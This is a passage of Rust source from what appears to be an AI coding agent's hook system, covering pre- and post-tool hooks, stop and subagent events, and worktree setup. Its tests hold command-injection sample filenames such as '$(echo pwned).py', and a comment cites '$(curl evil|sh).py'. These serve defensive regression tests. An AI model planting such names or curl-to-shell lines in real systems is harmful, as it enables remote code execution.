        &extra,
        cwd,
        project,
        task,
        cancel,
    )
    .await;
    let refused: Vec<String> = outs
        .iter()
        .filter_map(|o| {
            o.refusal()
                .map(|r| format!("`{}` refused it:\n{r}", o.command))
        })
        .collect();
    (!refused.is_empty()).then(|| refused.join("\n\n"))
}

/// Before a tool runs: it can refuse the call, and a trusted hook that was
/// approved with `updated_input` can rewrite its arguments.
///
/// Only a trusted hook reaches here at all, and the rewriting power is part of
/// the approved hash, so a repository cannot quietly grant it to a hook the user
/// approved for something narrower.
pub async fn pre_tool(
    hooks: &[Hook],
    tool: &str,
    input: &Value,
    cwd: &str,
    project: &str,
    task: &str,
    cancel: &CancellationToken,
) -> PreTool {
    let outs = fire(
        hooks,
        "pre_tool",
        tool,
        input,
        "",
        &[],
        cwd,
        project,
        task,
        cancel,
    )
    .await;
    let blocked = outs.iter().find(|o| o.refusal().is_some()).cloned();
    // Last rewrite wins, and only from a hook that may: a chain of hooks
    // patching one call is the useful case (a formatter then a linter), and the
    // last one to speak has been told about the others' output via OL_OUTPUT.
    let updated_input = outs.iter().rev().find_map(|o| o.updated_input());
    PreTool {
        blocked,
        updated_input,
    }
}

/// After a tool ran. The output is appended to the tool result by the caller.
pub async fn post_tool(
    hooks: &[Hook],
    tool: &str,
    input: &Value,
    output: &str,
    cwd: &str,
    project: &str,
    task: &str,
    cancel: &CancellationToken,
) -> Vec<HookOut> {
    fire(
        hooks,
        "post_tool",
        tool,
        input,
        output,
        &[],
        cwd,
        project,
        task,
        cancel,
    )
    .await
}

/// A run failed. Fired instead of — never as well as — a `stop` hook, because a
/// run that died never stops cleanly and a stop hook's "you are not finished"
/// nudge would be answered by an agent that is no longer running.
pub async fn error(
    hooks: &[Hook],
    message: &str,
    cwd: &str,
    project: &str,
    task: &str,
    cancel: &CancellationToken,
) -> Vec<HookOut> {
    let extra = [("OL_ERROR", message.to_string())];
    fire(
        hooks,
        "error",
        "",
        &Value::Null,
        message,
        &extra,
        cwd,
        project,
        task,
        cancel,
    )
    .await
}

/// A subagent finished. The matcher names the subagent's agent id, so a hook can
/// watch one kind of worker without caring about the rest.
pub async fn subagent_stop(
    hooks: &[Hook],
    subagent: &str,
    report: &str,
    cwd: &str,
    project: &str,
    task: &str,
    cancel: &CancellationToken,
) -> Vec<HookOut> {
    let extra = [
        ("OL_SUBAGENT", subagent.to_string()),
        ("OL_REPORT", report.to_string()),
    ];
    fire(
        hooks,
        "subagent_stop",
        subagent,
        &Value::Null,
        report,
        &extra,
        cwd,
        project,
        task,
        cancel,
    )
    .await
}

/// The agent tried to finish. A failing hook sends its output back and the agent
/// carries on (the caller caps how many times).
pub async fn stop(
    hooks: &[Hook],
    last_text: &str,
    cwd: &str,
    project: &str,
    task: &str,
    cancel: &CancellationToken,
) -> Vec<HookOut> {
    fire(
        hooks,
        "stop",
        "",
        &Value::Null,
        last_text,
        &[],
        cwd,
        project,
        task,
        cancel,
    )
    .await
}

/// Everything a freshly cut worktree is missing, put back.
///
/// Two halves, and both are here on purpose:
///
///  * the `.worktreeinclude` copy, which needs no shell, no approval and no
///    configuration beyond a file the repository ships. `.env`, `.env.local`,
///    `node_modules` and untracked build output are exactly what git does not
///    carry into a new worktree, so the agent's very first command fails for a
///    reason that has nothing to do with its task. This is Roo's mechanism and
///    it is the default answer: it works out of the box, and a file list cannot
///    execute anything.
///  * the `post_setup_worktree` hook, for what a file list cannot express — a
///    symlink into the original checkout's `node_modules`, a `pnpm install`, a
///    secret materialised from a keychain. `OL_ROOT` (and Windsurf's
///    `ROOT_WORKSPACE_PATH`) point at the checkout the worktree came from, so
///    the hook can reach what is not in the worktree.
///
/// Everything the setup step reports, keeping copy failures distinct from hook
/// failures so the user can act on the right cause.
pub struct WorktreeSetup {
    pub copied: usize,
    pub copy_error: Option<String>,
    pub hooks: Vec<HookOut>,
}

/// Run the setup for a worktree that has just been created. Some(include error)
/// is reported but never prevents hooks from attempting a different setup path.
pub async fn setup_worktree(
    hooks: &[Hook],
    project: &str,
    worktree: &str,
    task: &str,
    cancel: &CancellationToken,
) -> WorktreeSetup {
    let (copied, copy_error) = match super::git::populate_worktree(project, worktree) {
        Ok(copied) => (copied, None),
        Err(error) => (0, Some(error)),
    };
    let extra = [
        ("OL_WORKTREE", worktree.to_string()),
        ("OL_ROOT", project.to_string()),
        // Windsurf's name for the same thing, so a hook written for it ports
        // without an edit.
        ("ROOT_WORKSPACE_PATH", project.to_string()),
        ("OL_COPIED", copied.to_string()),
        ("OL_COPY_ERROR", copy_error.clone().unwrap_or_default()),
    ];
    let outs = fire(
        hooks,
        "post_setup_worktree",
        "",
        &Value::Null,
        "",
        &extra,
        // Inside the new worktree: that is the directory the hook is about.
        worktree,
        project,
        task,
        cancel,
    )
    .await;
    WorktreeSetup {
        copied,
        copy_error,
        hooks: outs,
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;

    /// A `.py` filename is interpolated into a `py_compile` command that runs
    /// unattended after an edit. Filenames come from the repository, and `$`, a
    /// backtick and `;` are all legal in one, so a path like
    /// `$(curl evil|sh).py` used to execute just by being edited. The plan must
    /// quote, and the quoting must hold for both shells `shell::run` picks.
    #[test]
    fn a_python_filename_cannot_inject_a_command() {
        assert_eq!(quote("/p/plain.py"), "'/p/plain.py'");
        assert_eq!(quote("/p/$(echo pwned).py"), "'/p/$(echo pwned).py'");
        assert_eq!(quote("/p/`id`.py"), "'/p/`id`.py'");
        // A single quote is closed, escaped and reopened rather than dropped.
        assert_eq!(quote("/p/it's.py"), r"'/p/it'\''s.py'");
        // No bare quote of any kind may survive into the command.
        for evil in [
            "$(id).py", "`id`.py", "a;b.py", "a|b.py", "a\nb.py", "a&b.py",
        ] {
            let q = quote(evil);
            assert!(
                q.starts_with('\'') && q.ends_with('\''),
                "{evil} must be wrapped"
            );
            assert!(
                !q[1..q.len() - 1].contains('\''),
                "{evil} left a bare quote"
            );
        }
    }

    /// The check itself has to carry the quoting, not just the helper: a plan
    /// built from an edited `.py` file must not contain an unquoted path.
    #[test]
    fn the_python_check_quotes_every_path() {
        let d = std::env::temp_dir().join(format!("ol-diagq-{}", std::process::id()));
        std::fs::create_dir_all(&d).unwrap();
        let evil = d.join("$(echo pwned).py");
        // `plan` rewrites separators to `/` for the shell, so compare against
        // that spelling rather than the platform-native one.
        let spelled = evil.to_string_lossy().replace('\\', "/");
        let p = plan(&d.to_string_lossy(), &[evil]);
        let check = p
            .iter()
            .find(|c| c.label == "python syntax")
            .expect("a .py edit gets a check");
        assert!(
            check.cmd.contains(&quote(&spelled)),
            "cmd was: {}",
            check.cmd
        );
        let _ = std::fs::remove_dir_all(&d);
    }

    #[test]
    fn loop_guard_fires_once_at_five() {
        let mut g = LoopGuard::default();
        let i = json!({"path": "x"});
        for _ in 0..LOOP_AT - 1 {
            assert!(g.record("edit_file", &i, true).is_none());
        }
        assert!(g.record("edit_file", &i, true).is_some());
        assert!(g.record("edit_file", &i, true).is_none(), "only once");
        assert!(g.record("edit_file", &i, false).is_none());
        assert!(g.record("edit_file", &i, true).is_none(), "success resets");
    }

    #[test]
    fn verify_commands() {
        assert!(is_verify_command("npm test"));
        assert!(is_verify_command("cargo build --release"));
        assert!(!is_verify_command("ls -la"));
        assert!(!is_verify_command("git status"));
    }

    #[test]
    fn diag_filters_to_edited_files() {
        let edited = vec![PathBuf::from("/p/src/App.tsx")];
        let out = "src/App.tsx(3,1): error TS2304: Cannot find name 'x'.\nsrc/Other.tsx(1,1): error TS1: nope\nFound 2 errors";
        assert_eq!(
            relevant(out, &edited),
            vec!["src/App.tsx(3,1): error TS2304: Cannot find name 'x'."]
        );
    }

    #[test]
    fn diag_plan_picks_projects() {
        let d = std::env::temp_dir().join(format!("ol-diag-{}", std::process::id()));
        std::fs::create_dir_all(d.join("src")).unwrap();
        std::fs::write(d.join("Cargo.toml"), "").unwrap();
        let p = plan(
            &d.to_string_lossy(),
            &[d.join("src/lib.rs"), d.join("src/main.rs"), d.join("a.py")],
        );
        assert_eq!(p.len(), 2, "one cargo check for both .rs files + python");
        assert_eq!(p[0].label, "cargo check");
        assert!(
            plan(&d.to_string_lossy(), &[d.join("x.ts")]).is_empty(),
            "no tsconfig/typescript: skipped"
        );
        let _ = std::fs::remove_dir_all(&d);
    }

    #[test]
    fn hooks_match() {
        let h = Hook {
            event: "pre_tool".into(),
            matcher: "bash|edit_file".into(),
            command: "echo".into(),
            enabled: true,
            ..Default::default()
        };
        assert!(hook_matches(&h, "pre_tool", "bash"));
        assert!(!hook_matches(&h, "pre_tool", "bash_output"), "anchored");
        assert!(!hook_matches(&h, "post_tool", "bash"));
        // `hook_matches` is about the pattern; whether it may *run* is the trust
        // gate, and an unapproved hook matches and does not run.
        assert!(!hook_runs(&h, "pre_tool", "bash"));
        let mut trusted = h.clone();
        trusted.trusted = true;
        assert!(hook_runs(&trusted, "pre_tool", "bash"));
    }
}
